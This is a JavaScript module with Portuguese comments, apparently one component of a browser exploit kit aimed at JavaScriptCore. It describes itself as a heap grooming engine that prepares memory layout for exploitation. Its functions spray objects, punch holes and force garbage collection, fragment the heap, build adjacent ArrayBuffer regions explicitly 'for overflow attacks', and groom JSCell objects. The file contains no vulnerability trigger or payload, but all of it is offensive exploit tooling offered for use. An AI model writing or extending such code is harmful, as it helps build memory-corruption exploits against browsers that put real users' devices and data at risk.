/**
 * MOD_GROOMER.JS — Heap Grooming Engine
 * Prepara o layout de memória para exploração
 */

export const Groomer = {
    heapLayout: [],
    sprayedObjects: [],
    
    /**
     * Spray de objetos no heap (técnica clássica)
     */
    sprayObjects: function(count = 1000, objectFactory = null) {
        const sprayed = [];
        
        const defaultFactory = () => ({
            a: 0x41414141,
            b: 0x42424242,
            c: 0x43434343,
            d: [1.1, 2.2, 3.3],
            e: 'SPRAYED_DATA_HERE'
        });
        
        const factory = objectFactory || defaultFactory;
        
        for (let i = 0; i < count; i++) {
            sprayed.push(factory());
        }
        
        this.sprayedObjects = sprayed;
        return sprayed;
    },
    
    /**
     * Cria buracos no heap (para preencher com objetos alvo)
     */
    createHoles: function(sprayedArray, holePattern = [true, false, true]) {
        const holes = [];
        
        for (let i = 0; i < sprayedArray.length; i++) {
            if (holePattern[i % holePattern.length]) {
                sprayedArray[i] = undefined;
                holes.push(i);
            }
        }
        
        // Força GC para liberar memória
        if (typeof gc === 'function') {
            gc();
        }
        
        return holes;
    },
    
    /**
     * Preenche buracos com objetos de tamanho específico
     */
    fillHoles: function(size = 0x40) {
        const padding = [];
        const targetSize = size;
        
        for (let i = 0; i < 1000; i++) {
            const arr = new Array(targetSize);
            arr.fill(0x41);
            padding.push(arr);
        }
        
        return padding;
    },
    
    /**
     * Fragmentação controlada do heap
     */
    fragmentHeap: function() {
        const fragments = [];
        
        // Aloca objetos de tamanhos variados
        for (let i = 0; i < 100; i++) {
            const size = (i % 10 + 1) * 8; // 8, 16, 24, ... 80
            fragments.push({
                data: new ArrayBuffer(size),
                index: i,
                size: size
            });
        }
        
        // Libera alternadamente
        for (let i = 0; i < fragments.length; i += 2) {
            fragments[i] = null;
        }
        
        // GC para consolidar fragmentação
        if (typeof gc === 'function') {
            gc();
        }
        
        return fragments;
    },
    
    /**
     * Cria regiões de memória adjacentes para ataques de overflow
     */
    createAdjacentRegions: function() {
        const regions = [];
        const REGION_SIZE = 0x1000; // 4KB
        
        for (let i = 0; i < 50; i++) {
            const before = new ArrayBuffer(REGION_SIZE);
            const target = new ArrayBuffer(64); // Objeto alvo menor
            const after = new ArrayBuffer(REGION_SIZE);
            
            // Preenche com padrões reconhecíveis
            const beforeView = new Uint8Array(before);
            const afterView = new Uint8Array(after);
            
            beforeView.fill(0xBB); // Before marker
            afterView.fill(0xAA);  // After marker
            
            regions.push({
                before: beforeView,
                target: target,
                after: afterView,
                index: i
            });
        }
        
        return regions;
    },
    
    /**
     * Manipula a geração de objetos JSCell
     */
    jscellGrooming: function() {
        const cells = [];
        
        // Cria diferentes tipos de células JSC
        for (let i = 0; i < 500; i++) {
            cells.push({
                string: 'A'.repeat(i % 100),
                number: 42.5 + i,
                object: { index: i },
                array: [i, i+1, i+2],
                function: function(x) { return x + i; }
            });
        }
        
        return cells;
    }
};